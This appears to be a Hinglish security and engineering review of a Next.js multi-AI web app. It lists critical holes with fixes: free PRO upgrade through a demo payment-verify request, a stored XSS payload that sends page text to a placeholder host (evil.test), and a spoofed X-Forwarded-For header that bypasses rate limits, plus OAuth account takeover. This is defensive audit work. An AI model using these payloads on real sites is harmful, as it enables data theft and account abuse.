# BUILDWE — Multi-AI Platform Review (Full Gap List)

**Date:** 31 Aug 2026 · **Branch:** `arena/01a0568a-buildwe` · **Version:** 1.11.3
**Method:** code padha, `tsc` + `next build` chalaya, server utha ke **har claim ko curl/runtime se exploit/test karke verify kiya**. Jo bhi cheez test nahi kar payi wo alag section me marked hai — andaaze pe kuch nahi likha.

---

## 0. Scene: ye repo hai kya

**BUILDWE.ONLINE** — ek "sab kuch ek jagah" AI workspace (Auto · Chat · Code · Image · Audio · Search · Vision · Files · Projects · Teams · Share · Public API · Billing). Next.js 14 App Router, ek hi codebase me frontend + 40 API routes + apna JSON "database" + multi-vendor AI router + coding agent + Razorpay billing.

Positioning: **free-tier-first, India-focused, gen-Z cream UI, BYOK-friendly, PWA**. Target user: student/founder/builder jo ChatGPT + cursor + image + TTS alag-alag tabs me nahi kholna chahta.

**Architecture (jaisa asal me hai):**

```
browser (app/page.tsx — 3934-line client monolith)
   ↓ fetch/SSE
40 route handlers (auth → rate-limit → limits → AI → persist)
   ↓
lib/ai/providers.ts ──→ provider-registry.ts (8 chat/code adapters)
   │                    models-catalog.ts (46 entries, 17 provider tags)
   │                    image-providers.ts / stt.ts / search.ts (apne alag paths)
   ├─→ agent.ts (plan→act→check→fix, 5 tools, static checks only)
   └─→ offline-brain.ts (key na ho to deterministic fallback)
   ↓
lib/db/store.ts — ek JSON file (/tmp ya ./data), 11 collections, 58 functions
   └─→ lib/db/remote.ts — Supabase "mirror" = POORA doc ek jsonb column me
```

**Verdict ek line me:** AI-orbiting product logic ka coverage genuinely impressive hai (ye chatbot-wrapper nahi, real routing/agent/quota/billing layer hai) — lekin ye abhi **production platform nahi, ek bohot polished prototype** hai. 4 aise holes hain jinke saamne baaki sab polish secondary hai, aur **poore platform ki credibility ek aise test suite par tiki hai jo repo me hai hi nahi**.

---

## 1. Jo cheezein sach me strong hain (samajh ke upar markup ke liye zaroori)

| Area | Kya pakka hai |
|---|---|
| Build/type health | `tsc --noEmit` **clean**, `next build` **clean** (40 routes + 16 pages compile) |
| Gateway layer | `lib/ai/gateway.ts` — har outbound call pe timeout, backoff+jitter retry, **401/400 retry nahi hota** (quota bachat), error taxonomy, user tak raw provider text never |
| Cost guards | 24k/msg, 120k/conversation, 8k prompt, 5k TTS, 40 messages — edge pe 413 ke saath |
| Availability-aware routing | Bina key wala provider score se pehle hat-ta hai — "menu with one dish" bug sach me fix hai |
| Cross-vendor fallback | chain pehle doosre vendor pe jaati hai — ek vendor down = capability down, nahi |
| Prompt-injection defence | web results `UNTRUSTED DATA` marked |
| Password storage | scrypt + per-user salt + `timingSafeEqual` |
| Prod secret guard | `SESSION_SECRET` na ho to production me **throw** karta hai (silent dev-default nahi) — maine live test karke dekha |
| Session fallback | DB me user na mile to bane JWT ka `plan` claim **trust nahi** hota, `free` maana jaata hai |
| Guest identity | `guest_xxx.HMAC` signed; forged cookie → fresh identity. `timingSafeEqual`. |
| Data isolation | owner-scoped queries + retention caps **per-owner** (global `slice()` wala cross-user delete bug sach me fixed hai) |
| BYOK | AES-256-GCM, `v1:iv:tag:data`, plaintext kabhi client ko nahi jaata |
| Code execution boundary | Server pe code **kabhi execute nahi** hota — client `iframe sandbox="allow-scripts"` + Web Worker. Ye sahi call hai. |
| Path traversal | `normalizeFilePath()` traversal/absolute/drive-letter/control-chars reject |

Baaki review isi standard pe hai: jo bol raha hoon, wo ya to line-referenced hai ya live-tested.

---

# 2. 🔴 CRITICAL — in 4 ko theek kiye bina "platform" label jhooth hoga

### C1. Bina paise diye PRO ban jao (business-logic hole) — **LIVE EXPLOIT CONFIRMED**

`NEXT_PUBLIC_DEMO_MODE` ka **default `"true"`** hai (`lib/config.ts:19`). Isse `livePayments()` false ho jaata hai, aur `verifyProPayment()` ka demo branch **bina HMAC, bina order existence check** `ok:true` de deta hai (`lib/payments/razorpay.ts`, demo branch) — phir `app/api/checkout/verify/route.ts:50` seedha `updateUser(userId,{plan:"pro"})` kar deta hai.

```
POST /api/auth/register   {"email":"hacker1@test.com","password":"pass123"}   → plan: free
POST /api/checkout/verify {"razorpay_order_id":"whatever",
                           "razorpay_payment_id":"junk","razorpay_signature":"nope"}
  → {"ok":true,"plan":"pro","demo":true,"message":"Demo payment verified — PRO activated."}
GET  /api/auth/me                                                          → plan: "pro"
```
Limits turant `code 15→500`, `image/audio 5→999999`, `chat 400→2000` — aur PRO model chain (Claude Sonnet / GPT-4o) unlock, **platform ke apne keys pe**. Koi bhi registered user, koi bhi rate limit nahi (`checkout/verify` pe rate limit **zero** hai).

**Fix:** (a) `NEXT_PUBLIC_DEMO_MODE` ka default `false`, sirf explicit `NODE_ENV!=="production"` pe demo; (b) demo verify kabhi `plan` na badle — sirf UI flow test kare; (c) `plan` pe `proExpiresAt` + paid-order-verified flag, demo rows pe `plan` write hi na ho.

---

### C2. Public share page pe stored XSS — **ATTRIBUTE INJECTION CONFIRMED**

`app/s/[id]/page.tsx:28` pe `esc()` sirf `& < >` escape karta hai — **quotes nahi**. Phir line **41**:

```js
.replace(/\[([^\]]+)\]\((https?:[^)]+)\)/g, '<a href="$2" target="_blank" rel="noopener noreferrer">$1</a>')
```

`$2` bina re-escape kiye `href="…"` ke andar ghus jaata hai → `"` daal ke attribute todo. Actual render, maine function nikaal ke chalaya:

```
input : [look](https://x" onclick="document.location='https://evil.test/e?d='+document.body.innerText)
output: <a href="https://x" onclick="document.location='https://evil.test/e?d='+document.body.innerText"
        target="_blank" rel="noopener noreferrer">look</a>
```
Valid JS, koi `)` nahi chahiye, click/focus pe fire. Attack chain: koi bhi user ye chat message likhe → conversation share kare → link victim ko bheje → **same-origin JS on buildwe.online**. `bw_session` httpOnly hai isliye cookie theft nahi, lekin victim ke browser se authenticated `POST /api/auth/delete`, plan change, BYOK overwrite, team join — sab possible (`/api/auth/delete` OAuth accounts ke liye password maangta hi nahi, sirf `confirm:"DELETE"`, dekho C4-note).

Note: `app/page.tsx` ka apna `md()` (line 286) links render **nahi** karta, isliye main workspace safe hai. Do alag markdown implementations ka matlab hai ek safe, ek unsafe — yahi asli wajah hai.

**Fix:** `esc()` me `"` aur `'` bhi escape karo, ya better: URL ko `new URL()` se parse karke sirf `protocol==='https:'` + `hostname` allowed, aur `href` value ko attribute-escape karo. `app/page.tsx` aur `app/s/[id]` ka `md()` **ek shared module** me daalo (duplicate renderer = duplicate bug class).

---

### C3. Har IP-based rate limit ek header se bypass — **CONFIRMED**

`lib/rate-limit/memory.ts:27` — `clientIp()` **bina kisi trusted-proxy check ke** pehla `X-Forwarded-For` value le leta hai.

```
26 login attempts, spoofed  -H "X-Forwarded-For: 9.9.9.N"  → 401 ×26  (limit never hit)
26 login attempts, no header                                → 401 ×20, then 429 ×6 ✓
```
Ye **saare** routes pe lagu hai (login 20/min, register 10/min, `ai:*`, verify, dev api) — credential stuffing aur free-tier token mining dono khula hai.

Doosra bug, same family: AI routes ka bucket key **compound** hai — `ai:chat:${session.userId}:${ip}` (`app/api/ai/chat/route.ts:32`). Compound key ka matlab: identity badlo ya IP badlo, **dono me se kisi bhi ek** ko rotate karke naya bucket. Guest identity to har cookie-less request pe nayi banti hai. Limit sirf tab kaam karti hai jab *dono* fixed hon — yani practically hamesha bypassable.

**Fix:** (a) `clientIp()` ko `TRUSTED_PROXY_CIDRS`/`VERCEL` check ke peeche band karo, fallback `socket.remoteAddress`; (b) user-bucket aur IP-bucket **alag-alag** enforce karo (`min(both)`), compound key nahi; (c) guest ke liye per-IP hard cap + per-IP total-account cap.

---

### C4. JSON "database" data **khaata** hai — concurrently, reproducibly

`lib/db/store.ts`: `read()` poori file parse karta hai, `write()` poori file `JSON.stringify` karke rename karta hai. **Koi lock nahi, koi compare-and-swap nahi.**

Single-process me ye safe hai (read→mutate→write synchronous hai, beech me koi `await` nahi) — jo `docs/PLATFORM_STATUS.md` "concurrent writes ek doosre ko overwrite karte hain" kehta hai wo **process ke andar galat** hai. Lekin **processes ke beech** kahin se bura hai. Live test, 3 Node process ek hi file pe:

```
process A: wrote 10, sees 10
process B: wrote 10, sees 10
process C: wrote 10, sees 10
--- shared file ke andar: ---
users: 2   conversations: 20   (expected 3 / 30)
```
**Ek poora user aur uske 10 conversations hamesha ke liye gayab.** Aur ye sirf local disk ka masla nahi: Supabase "mirror" (`lib/db/remote.ts`) bhi **poora document ek jsonb row me, last-write-wins, no CAS** — plus 1500 ms debounce, yani instance 1.5s me recycle ho gaya to write remote tak pahunchti hi nahi. `bootRemote()` instance-start pe **ek hi baar** pull karta hai, uske baad wo instance kabhi fresh data nahi padhta → multi-instance deploy pe users ka data instance-dependent ho jaata hai.

**Fix:** ye "mirror" nahi hai, ye **ek aur fragile copy** hai. `supabase/schema.sql` me bhi sirf 2 tables hain (`buildwe_kv`, `buildwe_rate_limits`) — 11 collections ke liye real tables nahi. Asli fix: Postgres me per-collection tables, `store.ts` ke 58 function signatures same rakhte hue andar se SQL. Ye 2-3 din ka kaam hai aur ye **is repo ki sabse zyada ROI wali single entry hai**.

---

# 3. 🟠 HIGH — platform ke roop me ye chhootna theek nahi

| # | Kami | Evidence | Asar |
|---|---|---|---|
| H1 | **Public `/api/v1/chat` pe koi quota nahi** — na `checkLimit`, na `recordUsage` | `app/api/v1/chat/route.ts` (grep: `checkLimit:0`). 5 calls ke baad bhi `usage.chat = 0`. | Paid API ka free bypass. 30/min/key × 8k chars, **daily cap zero**. API key + platform key = operator ke bill pe unlimited tokens. |
| H2 | **OAuth email-linking se account takeover** | `store.ts` `findOrCreateOauthUser`: email match ho gaya to existing account **link** ho jaata hai aur wahi session mil jaata hai. Google side `email_verified` check hai ✅, lekin GitHub path me fallback `user.email` **unverified** public email hai (`callback/route.ts`). | Attacker apna GitHub public email victim ka bana le → victim ka BUILDWE account uska. OAuth-only accounts me password nahi hota, isliye recovery bhi nahi. |
| H3 | **Zero tests in repo**, par docs "38/38 pass" kehte hain | `find . -iname "*test*"` → **kuch nahi**. `package.json` me koi `test` script nahi. `docs/PLATFORM_STATUS.md:305-307`: 38/38 regression, 19/19 agent, 8/8 router. | Ye sab **ad-hoc scripts the jo commit nahi hue**. Matlab: aaj ka koi bhi refactor (aur C1–C4 ke fixes refactor hain) regressed hai to pata chalega nahi. Trust-basis hi missing hai. |
| H4 | **`npm run lint` hang hota hai** | koi `.eslintrc*`/`eslint.config.*` nahi → `next lint` interactive "How would you like to configure ESLint?" prompt pe atak jaata hai (maine chalake dekha). | CI me lint daalna possible nahi. `package.json` me `lint` script ek trap hai. |
| H5 | **Koi CI nahi** (na `.github/`, na actions, na pre-commit hook) | `ls .github` → missing | Build/type/lint — kuch bhi har commit pe nahi chalta. 1-commit history ke saath milake: repo me engineering process ka concept hi nahi. |
| H6 | **2 HIGH npm vulns, Next.js included** | `npm audit`: `next@14.2.35` → **GHSA-955p-x3mx-jcvp "Unauthenticated disclosure of internal Server Function endpoints"**; `postcss <=8.5.22` → 4 advisories (arbitrary file read via `sourceMappingURL`, CSS XSS). | Next 14 ab maintenance pe nahi. Upgrade path `next@16` = breaking. Ek "multi-AI platform" ke liye ye deploy-blocking hai. |
| H7 | **`/api/history` pe koi limit nahi** (na rate, na size, na per-IP total) | grep: `ratelimit:0` on `history/route.ts` | 60 cookie-less POST = **+139 KB**, 90 conversations, aur har write poori DB dobara likhti hai. C4 ka amplifier: DB jitna bada, har request utni slowh — ek attacker poore platform ko 500 kar sakta hai bina auth ke. |
| H8 | **2 routes me hi zod hai, 38 me nahi** | grep `schema.parse`: sirf `auth/login`, `auth/register` | Baaki sab `String(body?.x \|\| "")` pe chalte hain. `body.messages` array bhi ho sakta hai, object bhi, `undefined` bhi — 400 ka shape guaranteed nahi. |
| H9 | **`SHOW_DEV_LINKS=true` ka koi production guard nahi** | `app/api/auth/forgot/route.ts` — bas `process.env.SHOW_DEV_LINKS === "true"`, `NODE_ENV` check nahi | Ek galataal env var = **password reset link API response body me**. `crypto.ts`/`session.ts` me prod-guard hai, yahan nahi — consistency tooti hui hai. |
| H10 | `/api/metrics` **bina auth public** | `app/api/metrics/route.ts` GET → `snapshot()` koi check nahi | Comment kehta hai "not linked in public UI" — obscurity ≠ auth. Uptime, per-route counters, TTFT, provider mix leak. |
| H11 | Team invite code **32-bit, hamesha valid, brute-force ke against unlimited** | `newTeamInvite`: `randomBytes(4)` → 8 hex; **expiry nahi**; `revoke` ka koi path nahi; `/api/teams` POST pe rate limit **0** | Team chats **cross-user padhi ja sakti hain** (`listVisibleConversations` teamId via). Invite code kabhi rotate/expire nahi hota. |
| H12 | Team member **doosre ki conversation ke teamId se kheench sakta hai** | `store.ts:1177-1185`: `isSameTeam` check member ko allow kar deta hai, owner hone ki zaroorat nahi | Data-integrity issue: maine apni chat team me daali, koi member use nikaal/saraka kar sakta hai. |
| H13 | **Email kabhi bheji nahi jaati** | grep poore repo me `resend\|smtp\|nodemailer\|sendEmail` → sirf `forgot/route.ts:10` me ek comment | `emailVerified` ka concept bana, verify token bana, UI bana — **delivery layer zero**. Matlab: naya user hamesha unverified rehta hai, reset flow **practically dead** hai (link sirf server log me). Ye onboarding ka sabse bada hole hai, docs ise "3 ghante" bolke chhota kar deti hain. |
| H14 | PRO ka **expiry concept hi nahi** | `User` type me sirf `plan: "free"\|"pro"`. Koi `proSince`/`proExpiresAt`/renewal nahi. | One-time `order` flow hai (subscription nahi) → ek baar PRO, **hamesha PRO**. `subscription.cancelled` handler hai par subscription create hi nahi hoti. Refund, dunning, invoice, GST — kuch nahi. |

---

# 4. 🟡 MEDIUM — AI platform specifically ke liye ye sab zaroori hai

### 4a. Model catalog: **advertised ≠ reachable** (multi-AI platform ka core claim yahin phasta hai)

- Docs kehti hain **"28 models, 9 vendors"**. Actual `MODEL_CATALOG`: **46 entries, 17 provider tags** (chat 14 · code 10 · image 9 · audio 8 · stt 2 · vision 2 · router 1). **Har doc number stale hai.**
- `provider-registry.ts` me `SPECS` ke sirf **8** entries hain (groq, openrouter, openai, anthropic, google, mistral, deepseek, together). Baaki 9 provider tags catalog me hain par registry me nahi → `providerAvailable()` unke liye hamesha `false`.
- **`cartesia` ka case sabse bura hai:** `sonic-english` ("Cartesia Sonic") catalog me `tiers:["pro","byok"]` ke saath baitha hai, lekin `AI_KEYS` me `cartesia` field **hai hi nahi** → ye model **permanent dead** hai, hamesha. Ye sirf ek entry nahi, UI me dikha jaane wala jhooth hai.
- Mirror-image bug: `AI_KEYS.replicate` (`.env.example` me `REPLICATE_API_TOKEN`) aur `ProviderKeys.replicate` documented hain, par catalog me **ek bhi `provider:"replicate"` entry nahi** → configured key kabhi use hi nahi hogi. Do taraf se do-do orphaned declarations.
- `providerForModel()` ka heuristic: catalog me id na mila to **`return "groq"`** (line 199). Yani `AI_CHAT_MODEL=kimi-k2` jaisa koi bhi non-catalog id → **Galat vendor pe bheja jaayega**. Ye wahi "menu with one dish" bug hai jise registry fix karne ka claim karti hai — sirf env-override path pe zinda hai.
- Retired/likely-wrong Groq ids: `llama-3.1-70b-versatile`, `llama-3.1-405b-reasoning`, `gemma2-9b-it`, aur **`qwen-2.5-coder-32b` — Groq pe kabhi tha hi nahi** (wo OpenRouter/Together format hai; `.env.example` me `AI_CODE_MODEL=qwen-2.5-coder-32b` as default likha hai!). `gemini-1.5-pro` Google se retire ho chuka hai. In sab ka matlab: **fallback chain 404 pe chalegi aur user ko offline-brain dikhega, "provider down" nahi.** Ek `models.test.ts` + a monthly live `/v1/models` diff isko pakad leta — H3 (no tests) ki asli keemat yahin chukani padti hai.
- `/api/ai/models` sirf **5 branded pseudo-models** return karta hai (`bw-ai`, `bw-code`, `bw-vision`, `bw-voice`, `bw-auto`). 46-entry catalog UI tak kahin nahi jaata → "multi-AI platform" ka sabse visible proof (model picker) missing. Docs bhi maan leti hain "PRO model picker: backend support karta hai, UI nahi deti".

### 4b. Capability coverage asymmetric hai

| Capability | Sach |
|---|---|
| Chat/Code | ✅ genuinely multi-provider (8 vendors) |
| Image | ✅ multi-provider, par `image-providers.ts` **apna alag ad-hoc dispatch** hai — registry se independent. Do source of truth. |
| Audio TTS | ⚠️ `generateAudioPlan()` sirf **Pollinations** try karta hai; ElevenLabs/OpenAI-TTS adapters bane hain par `AI_AUDIO_MODEL_PRO=eleven_multilingual_v2` default hone par bhi ek hi path chalega. Docs: "audio = 6 models" → reality = 1 live + browser-TTS fallback. |
| Vision | ⚠️ sirf Groq path, multi-provider nahi |
| STT | ⚠️ Deepgram+Whisper, par **`/api/ai/transcribe` pe `checkLimit` nahi** (grep: 0) → audio minutes ka koi counter hi nahi |
| Agent | ⚠️ `run_check` **static analysis only** (balanced braces, missing handlers). "verified=true" ka label **overclaim** hai — code chala ke verify nahi hua, sirf *dekh ke* verify hua. UI "verified banner" dikhata hai. Trust mislabel. |
| Streaming | Agent steps stream karta hai, **model tokens nahi** → agent mode me first-token latency feel buri |
| Cost metering | limits **per-feature** hain, per-**model** nahi. `FREE_CODE_DAILY_LIMIT=15` aur `/api/ai/agent` 1 unit leta hai par **8 steps × 6 models = ~48 completions**. Free user 15 agent runs se **720 model calls** laga sakta hai. |
| Long-term memory | `mind.ts` = skills + prefer/avoid strings. **Koi embedding / RAG / user-document index nahi.** "Platform" bolne par user yahi umeed karta hai. |
| Eval | **Koi eval set nahi.** Quality ka ek bhi measurement nahi — sirf `qualityGate()` heuristics (regression/experience based). Hallucination rate, refusal rate, groundedness: **zero telemetry**. |

### 4c. Platform/infra gaps

- **Storage abhi bhi 35% jaisa hi**: `lib/storage/media.ts` likha gaya hai aur accha hai, par `mediaStorageEnabled()` false hone par **audio base64 data URL** hi rehta hai → history me row hai, sound nahi. Image `pollinations.ai` URL hotlink — wo service free hai, **kal band ho sakti hai**, aur tab poori user history 404 hogi (koi backfill job nahi).
- **Metrics in-memory** → restart pe zero. `/status` aur `/api/metrics` restart ke baad "sab normal" dikhayenge jabki pichle 6 ghante ka kuch nahi bacha.
- **CSP ka apna bala**: `next.config.js` me `script-src 'unsafe-inline' 'unsafe-eval'` + `connect-src 'self' https:` + `img-src https:`. C2 jaisa XSS is CSP ke neeche **poori tarah kaam karega** — `connect-src https:` matlab exfil ke liye koi allowlist nahi. `unsafe-eval` ki zaroorat Next 14 dev pe hoti hai, prod pe nahi.
- `images.remotePatterns: [{ protocol:"https", hostname:"**" }]` — allow-all. (Mitigating: `next/image` kahin import hi nahi kiya gaya, to ye config **dead** hai.)
- `components/AdSlot.tsx:59` — `NEXT_PUBLIC_AD_HTML` ko raw `dangerouslySetInnerHTML`. Env-injected, haan, par `NEXT_PUBLIC_*` build-time bake hota hai → **kisi bhi third party ad HTML ko first-party origin pe JS dene ka permanent door**, CSP ke bawajood.

---

# 5. 🟠 Engineering hygiene — "repo ek platform ka hona chahiye"

| Kami | Detail | Kaam |
|---|---|---|
| **Monolith** | `app/page.tsx` = **3934 lines**, usme `function Dashboard()` **line 440 → 3757 = 3317 lines ek hi component**, andar **92 `useState`**, 9 `useEffect`. | Refactor: feature slices (`useChat`, `useCodeCanvas`, `useImageStudio`, `useAuthSheet`, `useProjects`) + Zustand/Jotai for shared state. Aaj koi ek bug fix is file me 3000 line ke beech blind surgical strike hai. |
| **Duplicate logic** | Do `md()` renderers (safe + unsafe — C2), do image dispatch paths, do rate-limiters (`memory` + `durable`) jo har route **khud choose** karta hai. `proj:files` POST `memory` wala use karta hai jabki baaki `durable` → wahi route multi-instance pe unprotected. | Shared modules + ek `withLimits()` middleware |
| **No error UX primitives** | `app/error.tsx` ❌, `app/loading.tsx` ❌, `app/global-error.tsx` ❌, `app/not-found.tsx` ❌, koi React ErrorBoundary ❌ | 4 file, 2 ghante. Abhi koi bhi uncaught render error = white screen |
| **Dead deps** | `uuid` ^14.0.2 **0 imports**, `nanoid` ^5 **0 imports**, `@types/uuid` ^10 (uuid apne types khud ship karta hai) | `npm uninstall uuid nanoid @types/uuid` — 1 minute, supply-chain surface chhota |
| **No LICENSE** | `ls LICENSE*` → missing | "platform" ke liye blocker: contributors/copyright undefined |
| **1-commit history** | `git log --all` → **1 commit**, ek hi contributor (bot) | Change history nahi = regression ka koi forensic trail nahi. Real branch/PR discipline chahiye |
| **`.gitignore` me `data`** | free local DB `/data` ignore hai — theek — par `.env.example` me `BUILDWE_DATA_DIR` documented **nahi**, jabki `store.ts:188` use karta hai | docs/ENV sync |
| **Version lying** | `package.json` = `1.11.3`, `docs/PLATFORM_STATUS.md` = "**Version: 1.10.0** · Branch `arena/01a0508e-buildwe`" | Docs ek doosre branch ke snapshot hain, current state ka truth nahi |
| **`app/print/page.tsx`** `app/about` `app/help` sab `194 B` — mostly static marketing pages | Theek hai, par `/changelog` **README me listed hai, file nahi hai** (404). SEO/trust page toota hua |

---

# 6. Frontend / UX / a11y kamiyaan (asli list)

1. **`app/layout.tsx:72` `maximumScale: 1`** → pinch-zoom **disabled**. WCAG 1.4.4 fail. Mobile users ke liye direct regression — aur cream-text UI me ye zyada chubhega.
2. **Google Fonts raw `<link>` se** (`layout.tsx:80`) → `next/font` use nahi hua = render-blocking request + font-swap FOUT. Next me ye 1-line fix hai aur LCP directly improve hoti hai.
3. **`suppressHydrationWarning` `<html>` pe** → theme script mismatch ko **chupana** is not fixing. Real fix: `color-scheme` + controlled `<html class>` from a single source.
4. **Language mixing, product-level:** API `hint` fields Hinglish me (`"Thoda ruk ke Try again dabao — 1 minute me limit reset ho jaati hai."`) aur `app/page.tsx:3557` tak — backend error copy **UI copy se hard-wired** hai, i18n layer zero. India-first choice samajh aa raha hai, par `hint` ko *server se* bhejna mtlb **har error ka translation API response me hi hona** — koi `en`/`hi` switch possible nahi bina backend change ke.
5. **`aria-label` count achha hai (42)**, par keyboard path sirf chat tak: **agent panel, image filmstrip, fullscreen viewer, project file list** — in sab ka keyboard/nav test repo me kahin nahi (docs bhi khud "Real-device mobile QA: test nahi hua" maan leti hain).
6. **Docs admit karti hain, main confirm karta hoon — ye UI elements abhi bhi missing hain:**
   - conversation **rename** nahi (delete hai)
   - PRO **model picker** nahi (backend `preferOffset`/`forceModel` ready hai, UI zero)
   - **diff view** nahi — agent file badalta hai, user ko purana vs nahi dikhta. *Multi-AI platform ke liye ye specifically painful hai:* agent pe trust build karne ka primary mechanism hi diff hai.
   - **multi-file preview** nahi — preview sirf canvas ka ek HTML `srcDoc` chalata hai; 60-file wala project ek preview me nahi chalta
7. **Free plan me image/audio hidden** ka koi code nahi mila (`.env.example` claim karta hai "free image/audio hidden in UI") — grep se confirm: `app/page.tsx` me plan-gated hiding nahi, sirf **server** pe 402 aata hai **generate karne ke baad attempt pe**. UX: user prompt likhe → click → 402 → upgrade banner. Rate-limit se pehle reject karna chahiye tha (client ko `usage`/`limits` already milte hain `/api/auth/me` se — the data is right there, unused).
8. **`sw.js`** `"/"` (dynamic, auth-dependent dashboard) cache karta hai network-first me; `skipWaiting()+clients.claim()` ke saath ek stale-but-authenticated shell doosre user ke context me serve ho sakta hai edge case me. API paths bypass hote hain ✅ (ye sahi hai).
9. **`app/manifest.ts`** me `screenshot`/`shortcuts`/`edge_side_panel` nahi → PWA install prompt kam attractive. Minor.
10. `137 kB` First Load JS for `/` — actually **bahut accha** hai 3300-line component ke liye; isme se 87 kB shared framework hai. Matlab bundle size ki tension nahi hai, **maintainability** ki hai. Report me ye note isliye zaroori hai taaki koi "performance" ko kami na bol de.

---

# 7. Docs vs Reality (important — kyunki ye docs hi pitch deck hain)

| Doc ka claim | Reality | Status |
|---|---|---|
| "Regression suite **38/38 pass**", "Agent unit **19/19**", "Router **8/8**" | **Repo me ek bhi test file nahi**, koi test script nahi | ❌ Reproduce/verify **impossible** — sabse serious credibility gap |
| "Rate limit in-memory hai (**HIGH**)" | `durable.ts` + `buildwe_rate_hit()` atomic SQL — **already built**; but default config pe `ok:false` → memory fallback | ⚠️ FIXED already, doc me abhi "kami" list me hai → **stale** |
| "Hardcoded dev-secret fallback — prod me fail hona chahiye" | `session.ts:21` **throws** in production | ✅ FIXED, doc me abhi open dikhta hai |
| "`userFromPayload()` JWT plan trust karta hai" | `session.ts:104` forces `plan:"free"`, with a comment explaining why | ✅ FIXED, doc me open dikhta hai |
| "28 models, 9 vendors" | 46 entries, 17 tags, **8 callable** | ❌ wrong on all 3 axes |
| "Database 60%, Supabase mirror optional" | mirror = whole-doc jsonb, no CAS, pull-once | ❌ 60% generous; durability claim **overstated** |
| "Schema poora hai, 11 collections" | `schema.sql` me **2 tables** (`buildwe_kv`, `buildwe_rate_limits`) | ❌ "poora schema" exists only as a JS type, not SQL |
| README "`/changelog` page" | file nahi hai | ❌ 404 |
| README "PRO $5/mo", layout metadata "$5/mo", JSON-LD `price:"500" INR`, `RAZORPAY_PRO_AMOUNT_PAISE=50000` | ₹500 INR ≠ $5/mo | ❌ three different prices in one repo. Legal/trust surface |
| `docs/PLATFORM_STATUS.md` "Branch `arena/01a0508e-buildwe`, v1.10.0" | actual: v1.11.3, is branch pe | ⚠️ version drift |

**Overall honest read:** docs **optimistic aur stale** hain — kuch cheezein jo fix ho chuki hain abhi bhi "kami" me listed hain (jo reader ko darati hain), aur jo kamiyan sach me critical hain (C1, C2, H1, H7) unka **koi zikr hi nahi**. Pattern: docs usi din ke snapshot hain jis din agent ne test chalaya tha, aaj ke system ka truth nahi.

---

# 8. Jo main test **nahi** kar paya (transparency)

Sandbox se **koi bhi outbound AI provider TLS reachable nahi** (Groq/OpenRouter/Pollinations/DDG/Deepgram/Fal — sab blocked). Isliye:
- ❌ kisi asli model ka output quality / latency / token cost **unverified**
- ❌ image generation ka real MP3/JPG **unverified**
- ❌ DDG scrape **unverified** — regex `result__a`/`result__snippet` markup pe based, jo DDG badal deta hai; likely brittle + ToS-wise sketchy (hard-coded Chrome UA spoof). `webSearchDetailed()` isliye achha bana hai ki wo empty-vs-unreachable **report** karta hai — design sahi hai, upstream bharosa kam.
- ✅ sab kuch jo local logic, guards, store, build, routing decision, aur HTTP-level exploit hai — **wo maine live chalake confirm kiya hai**.

---

# 9. Prioritized "kami → fix" list (effort ke saath)

### 🔴 P0 — iske bina platform nahi hai
| # | Fix | Effort | Impact |
|---|---|---|---|
| 1 | **Demo-mode free-PRO band** (default `false`, `plan` write on demo nahi) | 1 h | C1 closed |
| 2 | **Share-page XSS**: shared markdown module + `"`/`'` escape + URL protocol allowlist | 3 h | C2 closed |
| 3 | **`clientIp()` hardening + per-user/per-IP separate buckets** | 4 h | C3 closed (H11/H7 ka 70% bhi) |
| 4 | **Real Postgres** for 11 collections behind the existing 58 `store.ts` signatures | 2–3 d | C4 closed + H7 closed at root |
| 5 | **`checkLimit`+`recordUsage` in `/api/v1/chat`**, per-key daily cap, key scopes | 3 h | H1 closed |
| 6 | **OAuth: GitHub unverified email pe link karna band** — naya account banao, `emailVerified:false` | 2 h | H2 closed |
| 7 | **Test suite actually committed**: `vitest` + 40 routes' guards + C1/C2/C3/C4 regression tests + provider id liveness check | 2 d | H3/H5 closed, sab kuch verifiable |

### 🟠 P1 — production se pehle
8. ESLint config (`.eslintrc.json` with `next/core-web-vitals`) → `npm run lint` non-interactive → GitHub Actions (tsc + lint + test + build) — **1 din**
9. Next.js 14 → 15/16 upgrade for GHSA-955p + postcss — **1 din** (H6)
10. Email delivery (Resend) for verify+reset, `SHOW_DEV_LINKS` ko `NODE_ENV!=="production"` guard — **4 h** (H13, H9)
11. Model catalog hygiene: retire dead providers, remove `cartesia`, per-vendor `/models` liveness test, `providerForModel` default → **throw** not `"groq"` — **1 din** (4a)
12. `/api/metrics` behind an ops token/basic-auth — **1 h** (H10)
13. zod schemas on all 40 routes via one `parseBody(schema)` helper — **1 din** (H8)
14. Team invites: 128-bit, expiry, revoke, `limit` on `/api/teams`; `setConversationTeam` owner-only — **4 h** (H11, H12)
15. `error.tsx` + `not-found.tsx` + `global-error.tsx` — **2 h**
16. Pricing consistency: ek `PRICING` const (currency+amount) jo metadata, JSON-LD, pricing page, Razorpay sab wahin se padhein — **1 h**
17. LICENSE file + real git history discipline (branch/PR per change) — **1 h**
18. `npm uninstall uuid nanoid @types/uuid` — **1 min**

### 🟡 P2 — platform ko sach me "multi-AI" banane ke liye
19. **Model picker UI** (46-entry catalog, per-capability tabs, live/reachable badge from `/api/health`) — 1 d
20. **Diff view** for agent file writes — 4 h *(agent trust ke liye P2 se upar hona chahiye)*
21. **Per-model cost metering** (limits capability×model, agent run = N units) — 1 d
22. **Agent output streaming** (tokens, not just steps) — 1 d
23. **Vision multi-provider** + TTS registry unification (`image-providers.ts`/`stt.ts` ko `provider-registry.ts` pe laao — ek dispatch, ek source of truth) — 2 d
24. **Media ownership**: backfill job for existing Pollinations hotlinks; audio always mirrored — 1 d
25. **Metrics persistence** + `/status` pe real history — 4 h
26. Eval harness: 50-prompt golden set, per-model scoring, hallucination/refusal rate — 3 d *(AI platform ke liye ye P0-tier ka kaam hai, par 24 fixes ke baad hi meaningful)*
27. `next/font` for Inter + remove `maximumScale:1` + CSP tightening (`unsafe-eval` prod se out, `connect-src` allowlist) — 3 h
28. Multi-file preview (project → servable bundle) + PDF/DOCX/XLSX export — 2 d
29. Server-side execution sandbox (gVisor/Firecracker/`@bufbuild`-style isolated runner) **ya** product me explicitly "BUILDWE code nahi chalata" likh dena — decision, 5 d+
30. RAG / embeddings memory (user documents index) — 1 w

---

## 10. Bottom line

- **Vision/codebase ka ratio:** architecture genuinely sochsamajh ka hai — gateway timeouts, availability-aware routing, per-owner retention, "UNTRUSTED DATA" marking, fail-open rate limiter, sandboxed client execution. Ye koi vibe-coded demo nahi hai.
- **Lekin** 4 critical holes (C1 free-PRO, C2 XSS, C3 rate-limit bypass, C4 data loss) **maine is review me live exploit karke dikhaye** — aur **in chaaron ka docs me kahin zikr nahi**.
